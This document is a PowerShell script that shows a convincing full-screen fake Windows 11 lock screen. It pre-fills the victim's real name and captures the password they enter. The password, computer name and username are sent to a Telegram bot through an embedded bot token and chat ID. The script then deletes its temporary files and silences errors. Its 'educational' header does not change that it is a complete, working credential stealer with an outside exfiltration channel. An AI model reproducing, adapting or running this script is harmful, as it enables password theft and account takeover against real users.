#Made by Deadfire for educational purposes and legal use in ethical hacking labs

## --- CONFIGURATION ---
$telegramToken = '8719343462:AAHrS9Hv_mwUSAfRkoe5yLXu9RXJZlXuto4'
$telegramChatId = '7587830896'
# --- END CONFIGURATION ---

try {
    # Load necessary assemblies
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # Get user and computer info
    $username = $env:USERNAME
    $computerName = $env:COMPUTERNAME
    $displayName = $username
    try {
        $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Machine')
        $userObj = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($context, $username)
        if ($userObj.DisplayName) {
            $displayName = $userObj.DisplayName
        }
    } catch {}

    # Use TEMP folder (ALWAYS accessible)
    $tempDir = $env:TEMP
    $bgTemp = Join-Path $tempDir "bg.jpg"
    $profileTemp = Join-Path $tempDir "profile.png"

    # Download images
    $webClient = New-Object System.Net.WebClient
    try {
        $webClient.DownloadFile('https://raw.githubusercontent.com/deadfire63/win11-login-assets/main/background.jpg', $bgTemp)
    } catch {
        # If download fails, create a solid color background
        $bgTemp = $null
    }
    
    try {
        $webClient.DownloadFile('https://raw.githubusercontent.com/deadfire63/win11-login-assets/main/profile.png', $profileTemp)
    } catch {
        $profileTemp = $null
    }

    # Load images or create fallbacks
    $bgImage = if ($bgTemp -and (Test-Path $bgTemp)) { 
        [System.Drawing.Image]::FromFile($bgTemp) 
    } else {
        # Create a solid blue background
        $bmp = New-Object System.Drawing.Bitmap(1920, 1080)
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.Clear([System.Drawing.Color]::FromArgb(255, 0, 120, 215))
        $graphics.Dispose()
        $bmp
    }
    
    $profileImage = if ($profileTemp -and (Test-Path $profileTemp)) {
        [System.Drawing.Image]::FromFile($profileTemp)
    } else {
        # Create a default profile icon
        $bmp = New-Object System.Drawing.Bitmap(140, 140)
        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
        $graphics.Clear([System.Drawing.Color]::FromArgb(255, 0, 120, 215))
        $graphics.Dispose()
        $bmp
    }

    # --- GUI SETUP ---

    # Main Form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = ''
    $form.ControlBox = $false
    $form.FormBorderStyle = 'None'
    $form.WindowState = 'Maximized'
    $form.TopMost = $true
    $form.BackgroundImage = $bgImage
    $form.BackgroundImageLayout = 'Stretch'

    # Dark Overlay
    $overlay = New-Object System.Windows.Forms.Panel
    $overlay.Dock = 'Fill'
    $overlay.BackColor = [System.Drawing.Color]::FromArgb(180, 0, 0, 0)
    $form.Controls.Add($overlay)

    # Clock
    $clockLabel = New-Object System.Windows.Forms.Label
    $clockLabel.Font = New-Object System.Drawing.Font('Segoe UI Light', 42)
    $clockLabel.ForeColor = 'White'
    $clockLabel.Text = Get-Date -Format 'HH:mm'
    $clockLabel.AutoSize = $true
    $clockLabel.Location = New-Object System.Drawing.Point(60, 50)
    $overlay.Controls.Add($clockLabel)

    # Date
    $dateLabel = New-Object System.Windows.Forms.Label
    $dateLabel.Font = New-Object System.Drawing.Font('Segoe UI Light', 22)
    $dateLabel.ForeColor = 'White'
    $dateLabel.Text = Get-Date -Format 'dddd, MMMM dd'
    $dateLabel.AutoSize = $true
    $dateLabel.Location = New-Object System.Drawing.Point(60, 110)
    $overlay.Controls.Add($dateLabel)

    # Bottom icons panel
    $iconPanel = New-Object System.Windows.Forms.FlowLayoutPanel
    $iconPanel.FlowDirection = 'RightToLeft'
    $iconPanel.Size = New-Object System.Drawing.Size(350, 40)
    $iconPanel.BackColor = [System.Drawing.Color]::Transparent
    $iconPanel.Location = New-Object System.Drawing.Point($form.ClientSize.Width - 370, $form.ClientSize.Height - 70)
    $overlay.Controls.Add($iconPanel)
    
    $form.Add_Resize({
        $iconPanel.Location = New-Object System.Drawing.Point($form.ClientSize.Width - 370, $form.ClientSize.Height - 70)
    })

    # Network icon
    $networkLabel = New-Object System.Windows.Forms.Label
    $networkLabel.Text = '📶'
    $networkLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
    $networkLabel.ForeColor = 'White'
    $networkLabel.AutoSize = $true
    $iconPanel.Controls.Add($networkLabel)

    # Sound icon
    $soundLabel = New-Object System.Windows.Forms.Label
    $soundLabel.Text = '🔊'
    $soundLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
    $soundLabel.ForeColor = 'White'
    $soundLabel.AutoSize = $true
    $iconPanel.Controls.Add($soundLabel)

    # Battery icon
    $batteryLabel = New-Object System.Windows.Forms.Label
    $batteryLabel.Text = '🔋'
    $batteryLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
    $batteryLabel.ForeColor = 'White'
    $batteryLabel.AutoSize = $true
    $iconPanel.Controls.Add($batteryLabel)

    # Short date
    $dateShortLabel = New-Object System.Windows.Forms.Label
    $dateShortLabel.Text = Get-Date -Format 'M/d'
    $dateShortLabel.Font = New-Object System.Drawing.Font('Segoe UI', 12)
    $dateShortLabel.ForeColor = 'White'
    $dateShortLabel.AutoSize = $true
    $iconPanel.Controls.Add($dateShortLabel)

    # Login Container
    $loginContainer = New-Object System.Windows.Forms.Panel
    $loginContainer.Size = New-Object System.Drawing.Size(420, 500)
    $loginContainer.BackColor = [System.Drawing.Color]::Transparent
    $overlay.Controls.Add($loginContainer)
    $loginContainer.Left = ($form.ClientSize.Width - $loginContainer.Width) / 2
    $loginContainer.Top = ($form.ClientSize.Height - $loginContainer.Height) / 2
    
    $form.Add_Resize({
        $loginContainer.Left = ($form.ClientSize.Width - $loginContainer.Width) / 2
        $loginContainer.Top = ($form.ClientSize.Height - $loginContainer.Height) / 2
    })

    # Profile Picture
    $profilePic = New-Object System.Windows.Forms.PictureBox
    $profilePic.Size = New-Object System.Drawing.Size(140, 140)
    $profilePic.Location = New-Object System.Drawing.Point(140, 30)
    $profilePic.Image = $profileImage
    $profilePic.SizeMode = 'StretchImage'
    $loginContainer.Controls.Add($profilePic)

    # Display Name
    $nameLabel = New-Object System.Windows.Forms.Label
    $nameLabel.Text = $displayName
    $nameLabel.Font = New-Object System.Drawing.Font('Segoe UI Semilight', 26)
    $nameLabel.ForeColor = 'White'
    $nameLabel.Size = New-Object System.Drawing.Size(420, 50)
    $nameLabel.Location = New-Object System.Drawing.Point(0, 180)
    $nameLabel.TextAlign = 'MiddleCenter'
    $loginContainer.Controls.Add($nameLabel)
    
    # Options panel (Windows 11 style)
    $optionsPanel = New-Object System.Windows.Forms.Panel
    $optionsPanel.Size = New-Object System.Drawing.Size(380, 45)
    $optionsPanel.Location = New-Object System.Drawing.Point(20, 240)
    $optionsPanel.BackColor = [System.Drawing.Color]::FromArgb(30, 255, 255, 255)
    $loginContainer.Controls.Add($optionsPanel)

    # PIN label
    $pinLabel = New-Object System.Windows.Forms.Label
    $pinLabel.Text = 'PIN'
    $pinLabel.Font = New-Object System.Drawing.Font('Segoe UI', 12)
    $pinLabel.ForeColor = 'White'
    $pinLabel.Size = New-Object System.Drawing.Size(100, 45)
    $pinLabel.Location = New-Object System.Drawing.Point(15, 0)
    $pinLabel.TextAlign = 'MiddleLeft'
    $optionsPanel.Controls.Add($pinLabel)

    # Sign-in options
    $optionsLabel = New-Object System.Windows.Forms.Label
    $optionsLabel.Text = 'Sign-in options'
    $optionsLabel.Font = New-Object System.Drawing.Font('Segoe UI', 12)
    $optionsLabel.ForeColor = '#AAAAAA'
    $optionsLabel.Size = New-Object System.Drawing.Size(140, 45)
    $optionsLabel.Location = New-Object System.Drawing.Point(220, 0)
    $optionsLabel.TextAlign = 'MiddleRight'
    $optionsPanel.Controls.Add($optionsLabel)
    
    # Password Field
    $passwordBox = New-Object System.Windows.Forms.TextBox
    $passwordBox.Size = New-Object System.Drawing.Size(380, 50)
    $passwordBox.Location = New-Object System.Drawing.Point(20, 300)
    $passwordBox.Font = New-Object System.Drawing.Font('Segoe UI', 16)
    $passwordBox.PasswordChar = '●'
    $passwordBox.BackColor = '#333333'
    $passwordBox.ForeColor = 'White'
    $passwordBox.BorderStyle = 'FixedSingle'
    $loginContainer.Controls.Add($passwordBox)

    # "I forgot my PIN" Label
    $forgotPinLabel = New-Object System.Windows.Forms.Label
    $forgotPinLabel.Text = 'I forgot my PIN'
    $forgotPinLabel.Font = New-Object System.Drawing.Font('Segoe UI', 11)
    $forgotPinLabel.ForeColor = '#CCCCCC'
    $forgotPinLabel.Size = New-Object System.Drawing.Size(420, 30)
    $forgotPinLabel.Location = New-Object System.Drawing.Point(0, 360)
    $forgotPinLabel.TextAlign = 'MiddleCenter'
    $forgotPinLabel.Cursor = 'Hand'
    $loginContainer.Controls.Add($forgotPinLabel)

    # "Other user" Link
    $otherUserLabel = New-Object System.Windows.Forms.Label
    $otherUserLabel.Text = 'Other user'
    $otherUserLabel.Font = New-Object System.Drawing.Font('Segoe UI', 11)
    $otherUserLabel.ForeColor = '#AAAAAA'
    $otherUserLabel.Size = New-Object System.Drawing.Size(420, 30)
    $otherUserLabel.Location = New-Object System.Drawing.Point(0, 400)
    $otherUserLabel.TextAlign = 'MiddleCenter'
    $otherUserLabel.Cursor = 'Hand'
    $loginContainer.Controls.Add($otherUserLabel)

    # Hidden Button for submission
    $submitButton = New-Object System.Windows.Forms.Button
    $submitButton.Size = New-Object System.Drawing.Size(1, 1)
    $submitButton.Location = New-Object System.Drawing.Point(-10, -10)
    $loginContainer.Controls.Add($submitButton)

    # --- EVENT HANDLERS ---

    # Password submission event
    $submitAction = {
        $password = $passwordBox.Text
        if ([string]::IsNullOrWhiteSpace($password)) {
            return
        }
        
        # Disable input
        $passwordBox.Enabled = $false
        
        # Send data to Telegram
        $message = "WINDOWS 11 LOGIN`nPC: $computerName`nUser: $username`nDisplay: $displayName`nPassword: $password`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
        
        # URL encode the message
        $messageEncoded = [System.Uri]::EscapeDataString($message)
        $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$telegramChatId&text=$messageEncoded"
        
        try {
            Invoke-RestMethod -Uri $telegramUrl -Method Get -ErrorAction Stop | Out-Null
        } catch {}
        
        # Close the form after a delay
        Start-Sleep -Seconds 2
        $form.Close()
    }

    $submitButton.Add_Click($submitAction)
    $passwordBox.Add_KeyDown({
        if ($_.KeyCode -eq 'Enter') {
            $submitButton.PerformClick()
        }
    })

    # Cleanup on form close
    $form.Add_FormClosed({
        $bgImage.Dispose()
        $profileImage.Dispose()
        Start-Sleep -Seconds 1
        if ($bgTemp -and (Test-Path $bgTemp)) {
            Remove-Item $bgTemp -Force -ErrorAction SilentlyContinue
        }
        if ($profileTemp -and (Test-Path $profileTemp)) {
            Remove-Item $profileTemp -Force -ErrorAction SilentlyContinue
        }
    })
    
    # Set focus on password box when form is shown
    $form.Add_Shown({
        $passwordBox.Focus()
    })

    # Run the application
    [System.Windows.Forms.Application]::Run($form)

} catch {
    # Silently fail - don't show errors
}
